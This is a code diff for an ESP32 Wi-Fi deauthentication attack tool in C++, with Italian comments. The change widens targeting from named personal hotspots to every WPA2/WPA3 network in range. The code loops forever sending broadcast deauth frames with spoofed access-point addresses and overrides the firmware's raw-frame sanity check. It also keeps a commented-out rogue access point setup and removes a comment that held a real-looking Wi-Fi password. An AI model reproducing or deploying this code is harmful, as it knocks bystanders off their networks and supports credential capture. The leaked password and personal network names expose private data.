@@ -8,19 +8,21 @@ extern "C" {
 
 #include "nvs_flash.h"
 #include <time.h>
-#include "configure_wifi.h"
 }
+#include "deauth.hpp"
+
 #include "esp_log.h"
-#include "packet.hpp"
 #include <cstring>
 
 
 #define TASK_NAME "spam_task"
 
-PacketSender sender;
 wifi_ap_record_t *apRecords;
 void deauth_task(MacAddr bssid, uint8_t prim_chan);
 void attack_method_rogueap(wifi_ap_record_t* ap_record);
+
+
+
 
 
     // PARAMETRO .authmode
@@ -178,7 +180,8 @@ void scanWifi(void *pvParameter){
             print_auth_mode(apRecords[i].authmode);
             ESP_LOGI(TASK_NAME, "RSSI: %d", apRecords[i].rssi);
             ESP_LOGI(TASK_NAME, "########################################\n");
-            if(!strcmp("Xiaomi 11T Pro", (char *)apRecords[i].ssid) || !strcmp("Gama", (char *)apRecords[i].ssid)){
+            //if(!strcmp("iPhone di Chiara", (char *)apRecords[i].ssid) || !strcmp("iPhone di Chiara\n", (char *)apRecords[i].ssid)){
+            if(apRecords[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK){
                 while(1){
                     ESP_LOGI(TASK_NAME, "entering DEAUTH_TASK\n");
                     deauth_task(apRecords[i].bssid,apRecords[i].primary);
@@ -197,26 +200,26 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
   return 0; //LA FUNZIONE IMPEDISCE DI MANDARE PACCHETTI "STRANI"
 }
 
+/*
+esp_err_t esp32_deauther_configure_wifi(uint8_t channel){
+    wifi_config_t ap_config = {};
+    strcpy((char*)ap_config.ap.ssid,"Prosciutto wifi");
+    ap_config.ap.ssid_len = 14;
+    strcpy((char*)ap_config.ap.password,"prosciutto_w");
+    ap_config.ap.channel = channel;
+    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK,
+    ap_config.ap.ssid_hidden = 0;
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.beacon_interval = 60000;
 
-
-
+    return esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+}
+*/
 
 void deauth_task(MacAddr bssid, uint8_t prim_chan) {
 
     
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    
-
-    //.ap = {
-        //  .ssid = "Xiaomi 11T Pro",
-        // .ssid_len = 14,
-        // .password = "C@garella18",
-        // .channel = prim_chan,
-        // .authmode = WIFI_AUTH_WPA2_PSK,
-        /// .ssid_hidden = 0,
-        // .max_connection = 4,
-        // .beacon_interval = 60000
-
     const MacAddr TARGET = { 
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
     };
@@ -233,14 +236,11 @@ void deauth_task(MacAddr bssid, uint8_t prim_chan) {
     
     //08 b6 1f 3b 3c 54
     //spoofMAC(&AP);
-    ESP_LOGI(TASK_NAME, "dopo spoof MAC");
     //ESP_ERROR_CHECK(esp_wifi_set_mac(,AP));
     
     esp_err_t res;
 
-    
-    res = sender.deauth(TARGET, AP, bssid, 1, prim_chan);
-    ESP_LOGI(TASK_NAME, "dopo sender.deauth");
+    res = deauth(TARGET, AP, bssid, 1, prim_chan);
     
     ESP_LOGI(TASK_NAME," RES:  %s\n", esp_err_to_name(res));
     
@@ -274,6 +274,7 @@ void attack_method_rogueap(wifi_ap_record_t *ap_record){
 extern "C" void app_main(void) {
     srand(time(NULL));
 
+    
     nvs_flash_init();
     esp_netif_init();    
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
